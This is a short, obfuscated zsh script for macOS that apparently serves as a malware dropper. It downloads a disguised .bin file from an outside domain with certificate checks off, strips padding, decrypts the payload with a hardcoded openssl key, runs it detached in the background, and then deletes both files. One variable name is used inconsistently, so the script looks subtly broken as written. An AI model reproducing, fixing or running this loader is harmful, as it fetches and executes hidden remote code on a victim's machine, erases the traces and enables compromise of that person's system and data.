#!/bin/zsh
mwbwe=$(mktemp /tmp/rpb2bg.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6cc9ece012d42792.bin" -o "$mwbwez" || exit 1
z9pq3x=$(stat -f %z "$mwbwez"); ky2fvqa=$(( z9pq3x - 3832 - 2805 ))
tail -c +$(( 3832 + 1 )) "$mwbwez" | head -c $ky2fvqa | openssl enc -d -aes-256-cbc -k 08765e66433e930a0771d4bf -out "$mwbwe" 2>/dev/null
[ -s "$mwbwe" ] && chmod 700 "$mwbwe" && ( "$mwbwe" & ) && disown
( sleep 3; rm -f "$mwbwe" "$mwbwez" ) &>/dev/null &
